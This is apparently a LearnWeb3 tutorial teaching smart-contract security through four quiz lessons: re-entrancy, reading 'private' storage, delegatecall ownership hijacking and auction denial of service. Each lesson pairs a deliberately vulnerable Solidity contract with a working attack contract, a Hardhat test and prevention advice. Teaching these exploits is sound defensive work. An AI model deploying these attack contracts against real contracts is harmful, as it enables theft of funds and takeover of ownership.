# attack prevention-re-entrancy-privacy-delegateCall-dos
LearnWeb3 tutorial for preventing attacks

Lesson Type: Quiz
Estimated Time: 1-2 hours
Current Score: 100%
Re-Entrancy
Re-Entrancy is one of the oldest security vulnerabilities that was discovered in smart contracts. It is the exact vulnerability that caused the infamous 'DAO Hack' of 2016. Over 3.6 million ETH was stolen in the hack, which today is worth billions of dollars. 🤯

At the time, the DAO contained 15% of all Ethereum on the network as Ethereum was relatively new. The failure was having a negative impact on the Ethereum network, and Vitalik Buterin proposed a software fork where the attacker would never be able to transfer out his ETH. Some people agreed, some did not. This was a highly controversial event, and one which still is full of controversy.

At the end, it led to Ethereum being forked into two - Ethereum Classic, and the Ethereum we know today. Ethereum Classic's blockchain is the exact same as Ethereum up until the fork, but then proceeded as if the hack did happen and the attacker still controls the stolen funds. Today's Ethereum implemented the blacklist and it's as if that attack never happened. 🤔

This is a simplified version of that story, and the entire dynamic was quite complex. Everyone was stuck between a rock and a hard place. You can read more about this story here to know what happened in more detail

Let's learn more about this hack! 🚀

🤔 Why did the original Ethereum blockchain split into Ethereum and Ethereum Classic?


Due to differing opinions within the community about how to handle the DAO Hack

Due to potential profits of splitting the token into two

Due to different versions of Solidity being used for programming
What is Re-Entrancy?
Image

Re-Entrancy is the vulnerability in which if Contract A calls a function in Contract B, Contract B can then call back into Contract A while Contract A is still processing.

This can lead to some serious vulnerabilities in Smart contracts, often creating the possibility of draining funds from a contract.

Let's understand how this works with the example shown in the above diagram. Let's say Contract A has some function - call it f() that does 3 things:

Checks the balance of ETH deposited into Contract A by Contract B
Sends the ETH back to Contract B
Updates the balance of Contract B to 0
Since the balance gets updated after the ETH has been sent, Contract B can do some tricky stuff here. If Contract B was to create a fallback() or receive() function in it's contract, which would execute when it received ETH, it could call f() in Contract A again.

Since Contract A hasn't yet updated the balance of Contract B to be 0 at that point, it would send ETH to Contract B again - and herein lies the exploit, and Contract B could keep doing this until Contract A was completely out of ETH.

BUIDL
We will create a couple of smart contracts, GoodContract and BadContract to demonstrate this behaviour. BadContract will be able to drain all the ETH out from GoodContract.

Note All of these commands should work smoothly . If you are on windows and face Errors Like Cannot read properties of null (reading 'pickAlgorithm') Try Clearing the NPM cache using npm cache clear --force.

Lets build an example where you can experience how the Re-Entrancy attack happens.

To set up a Hardhat project, Open up a terminal and execute these commands

npm init --yes
npm install --save-dev hardhat
If you are on a Windows machine, please do this extra step and install these libraries as well :)

npm install --save-dev @nomicfoundation/hardhat-toolbox @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
In the same directory where you installed Hardhat run:

npx hardhat
Select Create a basic sample project
Press enter for the already specified Hardhat Project root
Press enter for the question on if you want to add a .gitignore
Press enter for Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?
Now you have a hardhat project ready to go!

Let's start by creating a new file inside the contracts directory called GoodContract.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract GoodContract {

    mapping(address => uint) public balances;

    // Update the `balances` mapping to include the new ETH deposited by msg.sender
    function addBalance() public payable {
        balances[msg.sender] += msg.value;
    }

    // Send ETH worth `balances[msg.sender]` back to msg.sender
    function withdraw() public {
        require(balances[msg.sender] > 0);
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Failed to send ether");
        // This code becomes unreachable because the contract's balance is drained
        // before user's balance could have been set to 0
        balances[msg.sender] = 0;
    }
}
The contract is quite simple. The first function, addBalance updates a mapping to reflect how much ETH has been deposited into this contract by another address. The second function, withdraw, allows users to withdraw their ETH back - but the ETH is sent before the balance is updated.

Now lets create another file inside the contracts directory known as BadContract.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodContract.sol";

contract BadContract {
    GoodContract public goodContract;
    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    // Starts the attack
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}
This contract is much more interesting, let's understand what is going on.

Within the constructor, this contract sets the address of GoodContract and initializes an instance of it.

The attack function is a payable function that takes some ETH from the attacker, deposits it into GoodContract, and then calls the withdraw function in GoodContract.

At this point, GoodContract will see that BadContract has a balance greater than 0, so it will send some ETH back to BadContract. However, doing this will trigger the receive() function in BadContract.

The receive() function will check if GoodContract still has a balance greater than 0 ETH, and call the withdraw function in GoodContract again.

This will create a loop where GoodContract will keep sending money to BadContract until it completely runs out of funds, and then finally reach a point where it updates BadContract's balance to 0 and completes the transaction execution. At this point, the attacker has successfully stolen all the ETH from GoodContract due to re-entrancy.

We will utilize Hardhat Tests to demonstrate that this attack actually works, to ensure that BadContract is actually draining all the funds from GoodContract. You can read the Hardhat Docs for Testing to get familiar with the testing environment.

Let's start off by creating a file named attack.js under the test folder, and add the following code there:

const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

describe("Attack", function () {
  it("Should empty the balance of the good contract", async function () {
    // Deploy the good contract
    const goodContractFactory = await ethers.getContractFactory("GoodContract");
    const goodContract = await goodContractFactory.deploy();
    await goodContract.deployed();

    //Deploy the bad contract
    const badContractFactory = await ethers.getContractFactory("BadContract");
    const badContract = await badContractFactory.deploy(goodContract.address);
    await badContract.deployed();

    // Get two addresses, treat one as innocent user and one as attacker
    const [_, innocentAddress, attackerAddress] = await ethers.getSigners();

    // Innocent User deposits 10 ETH into GoodContract
    let tx = await goodContract.connect(innocentAddress).addBalance({
      value: parseEther("10"),
    });
    await tx.wait();

    // Check that at this point the GoodContract's balance is 10 ETH
    let balanceETH = await ethers.provider.getBalance(goodContract.address);
    expect(balanceETH).to.equal(parseEther("10"));

    // Attacker calls the `attack` function on BadContract
    // and sends 1 ETH
    tx = await badContract.connect(attackerAddress).attack({
      value: parseEther("1"),
    });
    await tx.wait();

    // Balance of the GoodContract's address is now zero
    balanceETH = await ethers.provider.getBalance(goodContract.address);
    expect(balanceETH).to.equal(BigNumber.from("0"));

    // Balance of BadContract is now 11 ETH (10 ETH stolen + 1 ETH from attacker)
    balanceETH = await ethers.provider.getBalance(badContract.address);
    expect(balanceETH).to.equal(parseEther("11"));
  });
});
In this test, we first deploy both GoodContract and BadContract.

We then get two signers from Hardhat - the testing account gives us access to 10 accounts which are pre-funded with ETH. We treat one as an innocent user, and the other as the attacker.

We have the innocent user send 10 ETH to GoodContract. Then, the attacker starts the attack by calling attack() on BadContract and sending 1 ETH to it.

After the attack() transaction is finished, we check to see that GoodContract now has 0 ETH left, whereas BadContract now has 11 ETH (10 ETH that was stolen, and 1 ETH the attacker deposited).

To finally execute the test, on your terminal type:

npx hardhat test
If all your tests are passing, then the attack succeeded!

🤔 If you were building an ERC-721 contract where you wanted to let certain users, tracked through the `balances` mapping, to claim 1 NFT of their choice. Is this code vulnerable to a re-entrancy attack? (Hint: Think about what _safeMint does)

If you were building an ERC-721 contract where you wanted to let certain users, tracked through the `balances` mapping, to claim 1 NFT of their choice. Is this code vulnerable to a re-entrancy attack? (Hint: Think about what _safeMint does)

Yes

No
Prevention
There are two things you can do.

Either, you could recognize that this function was vulnerable to re-entrancy, and make sure you update the user's balance in the withdraw function before you actually send them the ETH, so if they try to callback into withdraw it will fail.

Alternatively, OpenZeppelin has a ReentrancyGuard library that provides a modifier named nonReentrant which blocks re-entrancy in functions you apply it to. It basically works like the following:

modifier nonReentrant() {
    require(!locked, "No re-entrancy");
    locked = true;
    _;
    locked = false;
}
If you were to apply this on the withdraw function, the callbacks into withdraw would fail because locked will be equal to true until the first withdraw function finishes executing, thereby also preventing re-entrancy.

🤔 Is the following withdraw() function susceptible to a Re-entrancy attack?

Is the following withdraw() function susceptible to a Re-entrancy attack?

Yes

No
🤔 Re-entrancy can be prevented by using an OpenZeppelin modifier?


True

False
Readings
These are optional, but recommended, readings

DAO Hack
Reentrancy Guard Library
Hardhat Testing
Submit Quiz

Lesson Type: Quiz
Estimated Time: 1-2 hours
Current Score: 100%
Accessing private data
When we start writing smart contracts and come across visibility modifiers like public, private, etc. we may think that if you want some variable's value to be readable by the public you need to declare it public, and that private variables cannot be read by anyone but the smart contract itself.

But, Ethereum is a public blockchain. So what does private data even mean?

In this level, we will see how you can actually read private variable values from any smart contract, and also clarify what private actually stands for - which is definitely not private data!

Lets go 🚀

What does private mean?
Function (and variable) visibility modifiers only affect the visibility of the function - and do not prevent access to their values. We know that public functions are those which can be called both externally by users and smart contracts, and also by the smart contract itself.

Similarly, internal functions are those which can only be called by the smart contract itself, and outside users and smart contracts cannot call those functions. external functions are the opposite, where they can only be called by external users and smart contracts, but not the smart contract that has the function itself.

private, similarly, just affects who can call that function. private and internal behave mostly similarly, except the fact that internal functions are also callable by derived contracts, whereas private functions are not.

So for example, if Contract A has a function f() which is marked internal, a second Contract B which inherits Contract A like

contract B is A {
  ...
}
can still call f().

However, if Contract A has a function g() which is marked private, Contract B cannot call g() even if it inherits from A.

The same is true for variables, as variables are basically just functions. private variables can only be accessed and modified by the smart contract itself, not even derived contracts. However, this does not mean that external parties cannot read the value.

🤔 It is safe to store private information on-chain?


True

False
BUIDL
We will build a simple contract, along with a Hardhat Test, to demonstrate this. Our contract will attempt to store data in private variables hoping that nobody will be able to read it's value.

The contract will take in password and username in its constructor and will store them in private variables.

User will somehow be able to access those private variables.

Concepts
To understand how this works, recall from the Ethereum Storage and Execution level that variables in Solidity are stored in 32 byte (256 bit) storage slots, and that data is stored sequentially in these storage slots based on the order in which these variables are declared.

Storage is also optimized such that if a bunch of variables can fit in one slot, they are put in the same slot. This is called variable packing, and we will learn more about this later.

Note All of these commands should work smoothly . If you are on windows and face Errors Like Cannot read properties of null (reading 'pickAlgorithm') Try Clearing the NPM cache using npm cache clear --force.

To set up a Hardhat project, Open up a terminal and execute these commands

npm init --yes
npm install --save-dev hardhat
If you are on a Windows machine, please do this extra step and install these libraries as well :)

npm install --save-dev @nomicfoundation/hardhat-toolbox @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
In the same directory where you installed Hardhat run:

npx hardhat
Select Create a basic sample project
Press enter for the already specified Hardhat Project root
Press enter for the question on if you want to add a .gitignore
Press enter for Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?
Now you have a hardhat project ready to go!

Let's start by creating a Login.sol file inside the contracts folder. Add the following lines of code to your file

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Login {

    // Private variables
    // Each bytes32 variable would occupy one slot
    // because bytes32 variable has 256 bits(32*8)
    // which is the size of one slot

    // Slot 0
    bytes32 private username;
    // Slot 1
    bytes32 private password;

    constructor(bytes32  _username, bytes32  _password) {
        username = _username;
        password = _password;
    }
}
Since both declared variables are bytes32 variables, we know that each variable takes up exactly one storage slot. Since the order matters, we know that username will take up Slot 0 and password will take up Slot 1.

🤔 How many storage slots will be used for this contract?

How many storage slots will be used for this contract?

2

3

6
Therefore, instead of attempting to read these variable values by calling the contract, which is not possible, we can just access the storage slots directly. Since Ethereum is a public blockchain, all nodes have access to all the state.

Let's write a Hardhat Test to demonstrate this functionality.

Create a new file attack.js inside the test folder and add the following lines of code

const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Attack", function () {
  it("Should be able to read the private variables password and username", async function () {
    // Deploy the login contract
    const loginFactory = await ethers.getContractFactory("Login");

    // To save space, we would convert the string to bytes32 array
    const usernameBytes = ethers.utils.formatBytes32String("test");
    const passwordBytes = ethers.utils.formatBytes32String("password");

    const loginContract = await loginFactory.deploy(
      usernameBytes,
      passwordBytes
    );
    await loginContract.deployed();

    // Get the storage at storage slot 0,1
    const slot0Bytes = await ethers.provider.getStorageAt(
      loginContract.address,
      0
    );
    const slot1Bytes = await ethers.provider.getStorageAt(
      loginContract.address,
      1
    );

    // We are able to extract the values of the private variables
    expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("test");
    expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("password");
  });
});
In this test, we first create usernameBytes and passwordBytes, which are bytes32 versions of a short string to behave as our username and password. We then deploy the Login contract with those values.

After the contract is deployed, we use provider.getStorageAt to read storage slot values at loginContract.address for slots 0 and 1 directly, and extract the byte values from it.

Then, we can compare the retrieved values - slot0Bytes against usernameBytes and slot1Bytes against passwordBytes to ensure they are, in fact, equal.

If the tests pass, it means we were successfully able to read the values of the private variables directly without needing to call functions on the contract at all.

Finally, lets run this test and see if it works. On your terminal type:

npx hardhat test
The tests should pass. Wow, we could actually read the password!

Prevention
NEVER store private information on a public blockchain. No other way around it.

🤔 What is the correct way to read the value of variable `d` in this contract?

What is the correct way to read the value of variable `d` in this contract?

provider.getStorageAt(0);

provider.getStorageAt(4);

provider.getStorageAt(1);
Submit Quiz

Lesson Type: Quiz
Estimated Time: 2-3 hours
Current Score: 100%
.delegatecall(...)
Image

.delegatecall() is a method in Solidity used to call a function in a target contract from an original contract. However, unlike other methods, when the function is executed in the target contract using .delegatecall(), the context is passed from the original contract i.e. the code executes in the target contract, but variables get modified in the original contract.

Through this tutorial, we will learn why its important to correctly understand how .delegatecall() works or else it can have some severe consequences.

Wait, what?
Lets start by understanding how this works.

The important thing to note when using .delegatecall() is that the context the original contract is passed to the target, and all state changes in the target contract reflect on the original contract's state and not on the target contract's state even though the function is being executed on the target contract.

🤔 What happens when the target contract is called from the original contract using the `delegatecall()` method?


It executes the function using the context of the target contract

It executes the function using the context of the original contract

It executes the function using no context
Hmm, not that clear right 🥲, I feel you. So lets try understanding by an example.

In Ethereum, a function can be represented as 4 + 32*N bytes where 4 bytes are for the function selector and the 32*N bytes are for function arguments.

Function Selector: To get the function selector, we hash the function's name along with the type of its arguments without the empty space eg. for something like putValue(uint value), you will hash putValue(uint) using keccak-256 which is a hashing function used by Ethereum and then take its first 4 bytes. To understand keccak-256 and hashing better, I suggest you watch this video
Function Argument: Convert each argument into a hex string with a fixed length of 32 bytes and concatenate them.
🤔 How can a function in Ethereum be represented?


Using 32 bytes

Using 256 bytes

4 + 32*N where N is the number of arguments in the function
🤔 How do we construct a function selector?


We hash the function's name along with the arguments without the empty space and then takes its first 4 bytes

We hash the function's name along with the arguments with the empty space and then takes its first 4 bytes

We hash the function's name along with the arguments with the empty space and then takes its first 32 bytes
🤔 What is a function argument in context of delegatecall?


Function argument is created when you concatenate the first 2 arguments in the function

Function argument is created when you convert each argument into a 32 bytes hex string and then concatenate them

Function argument is created when you concatenate all the arguments in the function
We have two contracts Student.sol and Calculator.sol. We dont know the ABI of Calculator.sol but we know that their exists an add function which takes in two uint's and adds them up within the Calculator.sol

Lets see how we can use delegateCall to call this function from Student.sol

pragma solidity ^0.8.4;

contract Student {

    uint public mySum;
    address public studentAddress;
    
    function addTwoNumbers(address calculator, uint a, uint b) public returns (uint)  {
        (bool success, bytes memory result) = calculator.delegatecall(abi.encodeWithSignature("add(uint256,uint256)", a, b));
        require(success, "The call to calculator contract failed");
        return abi.decode(result, (uint));
    }
}
pragma solidity ^0.8.4;

contract Calculator {
    uint public result;
    address public user;
    
    function add(uint a, uint b) public returns (uint) {
        result = a + b;
        user = msg.sender;
        return result;
    }
}
Our Student contract here has a function addTwoNumbers which takes an address, and two numbers to add together. Instead of executing it directly, it tries to do a .delegatecall() on the address for a function add which takes two numbers.

We used abi.encodeWithSignature, also the same as abi.encodeWithSelector, which first hashes and then takes the first 4 bytes out of the function's name and type of arguments. In our case it did the following: (bytes4(keccak256(add(uint,uint)) and then appends the parameters - a, b to the 4 bytes of the function selector. These are 32 bytes long each (32 bytes = 256 bits, which is what uint256 can store).

All this when concatenated is passed into the delegatecall method which is called upon the address of the calculator contract.

The actual addition part is not that interesting, what's interesting is that the Calculator contract actually sets some state variables. But remember when the values are getting assigned in Calcultor contract, they are actually getting assigned to the storage of the Student contract because deletgatecall uses the storage of the original contract when executing the function in the target contract. So what exactly will happen is as follows:

Image

🤔 What is a delegatecall method in solidity?


A solidity method used to call a function in a target contract from original contract

A solidity method used to delegate a task to an EOA

A solidity method used to call an internal function within the contract
You know from the previous lessons that each variable slot in solidity is of 32 bytes which is 256 bits. And when we used .delegatecall() from Student to Calculator we used the storage of Student and not of Calculator but the problem is that even though we are using the storage of Student, the slot numbers are based on the calculator contract and in this case when you assign a value to result in the add function of Calculator.sol, you are actually assigning the value to mySum which in the student contract.

This can be problematic, because storage slots can have variables of different data types. What if the Student contract instead had values defined in this order?

contract Student {
    address public studentAddress;
    uint public mySum;
}
In this case, the address variable would actually end up becoming the value of result. You may be thinking how can an address data type contain the value of a uint? To answer that, you have to think a little lower-level. At the end of the day, all data types are just bytes. address and uint are both 32 byte data types, and so the uint value for result can be set in the address public studentAddress variable as they're both still 32 bytes of data.

Actual Use Cases
.delegatecall() is heavily used within proxy (upgradeable) contracts. Since smart contracts are not upgradeable by default, the way to make them upgradeable is typically by having one storage contract which does not change, which contains an address for an implementation contract. If you wanted to update your contract code, you change the address of the implementation contract to something new. The storage contract makes all calls using .delegatecall() which allows to run different versions of the code while maintaining the same persisted storage over time, no matter how many implementation contracts you change. Therefore, the logic can change, but the data is never fragmented.

🤔 Where is delegate call method heavily used?


Non upgradeable contracts

Proxy contracts

On a daily basis to call functions in target contract from original contract
Attack using delegatecall
But, since .delegatecall() modifies the storage of the contract calling the function, there are some nasty attacks that can be designed if .delegatecall() is not properly implemented. We will now simulate an attack using .delegatecall().

What will happen?
We will have three smart contracts Attack.sol, Good.sol and Helper.sol
Hacker will be able to use Attack.sol to change the owner of Good.sol using .delegatecall()
Build
Lets build an example where you can experience how the the attack happens.

To setup a Hardhat project, Open up a terminal and execute these commands

npm init --yes
npm install --save-dev hardhat
If you are on a Windows machine, please do this extra step and install these libraries as well :)

npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
In the same directory where you installed Hardhat run:

npx hardhat
Select Create a basic sample project
Press enter for the already specified Hardhat Project root
Press enter for the question on if you want to add a .gitignore
Press enter for Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?
Now you have a hardhat project ready to go!

Let's start off by creating an innocent looking contract - Good.sol. It will contain the address of the Helper contract, and a variable called owner. The function setNum will do a delegatecall() to the Helper contract.

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Good {
    address public helper;
    address public owner;
    uint public num;

    constructor(address _helper) {
        helper = _helper;
        owner = msg.sender;
    }

    function setNum( uint _num) public {
        helper.delegatecall(abi.encodeWithSignature("setNum(uint256)", _num));
    }
}
After creating Good.sol, we will create the Helper contract inside the contracts directory named Helper.sol. This is a simple contract which updates the value of num through the setNum function. Since it only has one variable, the variable will always point to Slot 0. When used with delegatecall, it will modify the value at Slot 0 of the original contract.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Helper {
    uint public num;

    function setNum(uint _num) public {
        num = _num;
    }
}
Now create a contract named Attack.sol within the contracts directory and write the following lines of code. We will understand how it works step by step.

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    address public helper;
    address public owner;
    uint public num;

    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        // This is the way you typecast an address to a uint
        good.setNum(uint(uint160(address(this))));
        good.setNum(1);
    }
}
The attacker will first deploy the Attack.sol contract and will take the address of a Good contract in the constructor. He will then call the attack function which will further initially call the setNum function present inside Good.sol

Intresting point to note is the argument with which the setNum is initially called, its an address typecasted into a uint256, which is it's own address. After setNum function within the Good.sol contract recieves the address as a uint, it further does a delegatecall to the Helper contract because right now the helper variable is set to the address of the Helper contract.

Within the Helper contract when the setNum is executed, it sets the _num which in our case right now is the address of Attack.sol typecasted into a uint into num. Note that because num is located at Slot 0 of Helper contract, it will actually assign the address of Attack.sol to Slot 0 of Good.sol. Woops... You may see where this is going. Slot 0 of Good is the helper variable, which means, the attacker has successfully been able to update the helper address variable to it's own contract now.

Now the address of the helper contract has been overwritten by the address of Attack.sol. The next thing that gets executed in the attack function within Attack.sol is another setNum but with number 1. The number 1 plays no relevance here, and could've been set to anything.

Now when setNum gets called within Good.sol it will delegate the call to Attack.sol because the address of helper contract has been overwritten.

The setNum within Attack.sol gets executed which sets the owner to msg.sender which in this case is Attack.sol itself because it was the original caller of the delegatecall and because owner is at Slot 1 of Attack.sol, the Slot 1 of Good.sol will be overwriten which is its owner.

Boom the attacker was able to change the owner of Good.sol 👀 🔥

Lets try actually executing this attack using code. We will utilize Hardhat Tests to demonstrate the functionality.

Inside the test folder create a new file named attack.js and add the following lines of code

const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("Should change the owner of the Good contract", async function () {
    // Deploy the helper contract
    const helperContract = await ethers.getContractFactory("Helper");
    const _helperContract = await helperContract.deploy();
    await _helperContract.deployed();
    console.log("Helper Contract's Address:", _helperContract.address);

    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.deploy(_helperContract.address);
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy(_goodContract.address);
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    // Now lets attack the good contract

    // Start the attack
    let tx = await _attackContract.attack();
    await tx.wait();

    expect(await _goodContract.owner()).to.equal(_attackContract.address);
  });
});
To execute the test to verify that the owner of Good contract was indeed changes, in your terminal pointing to the directory which contains all your code for this level execute the following command

npx hardhat test
If your tests are passing the owner address of good contract was indeed changed, since we equate the value of the owner variable in Good to the address of the Attack contract at the end of the test.

Lets goo 🚀🚀

Prevention
Use stateless library contracts which means that the contracts to which you delegate the call should only be used for execution of logic and should not maintain state. This way, it is not possible for functions in the library to modify the state of the calling contract.

🤔 How to prevent attacks on contracts which are using delegatecall?


Maintain the state in the target contract for your system

Maintain the state in the original contract for your system

Dont maintain a state at all
References
Delegate call
Solidity by Example
🤔 Whats going to happen when we call the setRollNumber function?

Whats going to happen when we call the setRollNumber function?

rollNumber in Student.sol will be set to 10

user will be set to 10 in Student.sol

rollNumber in Helper.sol will be set to 10
🤔 What value should be returned if we call the greeting function?

What value should be returned if we call the greeting function?

Throws an error

hello

Empty string
Submit Quiz

Lesson Type: Quiz
Estimated Time: 1-2 hours
Current Score: 0%
Denial of Service
Image

A Denial of Service (DOS) attack is a type of attack that is designed to disable, shut down, or disrupt a network, website, or service. Essentially it means that the attacker somehow can prevent regular users from accessing the network, website, or service therefore denying them service. This is a very common attack which we all know about in web2 as well but today we will try to immitate a Denial of Service attack on a smart contract

🤔 What is a DOS attack?


It's an attack introduced to corrupt data

It's an attack introduced to steal data

It's an attack disable the service
🤔 What does DOS stand for?


Denial Of Service

Denial Of System

Denial Of State
Lets goo 🚀

DOS Attacks in Smart Contracts
What will happen?
There will be two smart contracts - Good.sol and Attack.sol. Good.sol will be used to run a sample auction where it will have a function in which the current user can become the current winner of the auction by sending Good.sol higher amount of ETH than was sent by the previous winner. After the winner is replaced, the old winner is sent back the money which he initially sent to the contract.

Attack.sol will attack in such a manner that after becoming the current winner of the auction, it will not allow anyone else to replace it even if the address trying to win is willing to put in more ETH. Thus Attack.sol will bring Good.sol under a DOS attack because after it becomes the winner, it will deny the ability for any other address to becomes the winner.

Build
Lets build an example where you can experience how the the attack happens.

To setup a Hardhat project, Open up a terminal and execute these commands

npm init --yes
npm install --save-dev hardhat
If you are not on mac, please do this extra step and install these libraries as well :)

npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
In the same directory where you installed Hardhat run:

npx hardhat
Select Create a basic sample project
Press enter for the already specified Hardhat Project root
Press enter for the question on if you want to add a .gitignore
Press enter for Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?
Now you have a hardhat project ready to go!

Let's create the auction contract, named Good.sol, with the following code.

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Good {
    address public currentWinner;
    uint public currentAuctionPrice;

    constructor() {
        currentWinner = msg.sender;
    }

    function setCurrentAuctionPrice() public payable {
        require(msg.value > currentAuctionPrice, "Need to pay more than the currentAuctionPrice");
        (bool sent, ) = currentWinner.call{value: currentAuctionPrice}("");
        if (sent) {
            currentAuctionPrice = msg.value;
            currentWinner = msg.sender;
        }
    }
}
This is a pretty basic contract which stores the address of the last highest bidder, and the value that they bid. Anyone can call setCurrentAuctionPrice and send more ETH than currentAuctionPrice, which will first attempt to send the last bidder their ETH back, and then set the transaction caller as the new highest bidder with their ETH value.

Now, create a contract named Attack.sol within the contracts directory and write the following lines of code

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}
This contract has a function called attack(), that just calls setCurrentAuctionPrice on the Good contract. Note, however, this contract does not have a fallback() function where it can receive ETH. More on this later.

Let's create an attack that will cause the Good contract to become unusable. Create a new file under test folder named attack.js and add the following lines of code to it

const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("After being declared the winner, Attack.sol should not allow anyone else to become the winner", async function () {
    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.deploy();
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy(_goodContract.address);
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    // Now lets attack the good contract
    // Get two addresses
    const [_, addr1, addr2] = await ethers.getSigners();

    // Initially let addr1 become the current winner of the aution
    let tx = await _goodContract.connect(addr1).setCurrentAuctionPrice({
      value: ethers.utils.parseEther("1"),
    });
    await tx.wait();

    // Start the attack and make Attack.sol the current winner of the auction
    tx = await _attackContract.attack({
      value: ethers.utils.parseEther("3.0"),
    });
    await tx.wait();

    // Now lets trying making addr2 the current winner of the auction
    tx = await _goodContract.connect(addr2).setCurrentAuctionPrice({
      value: ethers.utils.parseEther("4"),
    });
    await tx.wait();

    // Now lets check if the current winner is still attack contract
    expect(await _goodContract.currentWinner()).to.equal(
      _attackContract.address
    );
  });
});
Notice how Attack.sol will lead Good.sol into a DOS attack. First addr1 will become the current winner by calling setCurrentAuctionPrice on Good.sol then Attack.sol will become the current winner by sending more ETH than addr1 using the attack function. Now when addr2 will try to become the new winner, it wont be able to do that because of this check(if (sent)) present in the Good.sol contract which verifies that the current winner should only be changed if the ETH is sent back to the previous current winner.

Since Attack.sol doesnt have a fallback function which is necessary to accept ETH payments, sent is always false and thus the current winner is never updated and addr2 can never become the current winner

To run the test, in your terminal pointing to the root directory of this level execute the following command

npx hardhat test
When the tests pass, you will notice that the Good.sol is now under DOS attack because after Attack.sol becomes the current winner, on other address can becomes the current winner.

🤔 DOS attacks happen in?


Web2

We3

Both Web2 and Web3
Prevention
You can create a seperate withdraw function for the previous winners.
Example:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Good {
    address public currentWinner;
    uint public currentAuctionPrice;
    mapping(address => uint) public balances;
    
    constructor() {
        currentWinner = msg.sender;
    }

    function setCurrentAuctionPrice() public payable {
        require(msg.value > currentAuctionPrice, "Need to pay more than the currentAuctionPrice");
        balances[currentWinner] += currentAuctionPrice;
        currentAuctionPrice = msg.value;
        currentWinner = msg.sender;
    }
    
    function withdraw() public {
        require(msg.sender != currentWinner, "Current winner cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
Hope you liked this level ❤️, keep building.

WAGMI 🚀

🤔 Which one of the following is an example of DOS attack?


Multiple requests sent to the server within its capacity

Multiple requests sent to the server outside its capacity

Not sending any request to the server for a long time
🤔 Is this a valid example of DOS attack?

Is this a valid example of DOS attack?

Yes

No
🤔 Is this a valid example of DOS attack?

Is this a valid example of DOS attack?

Yes

No
Refereces
Solidity by example
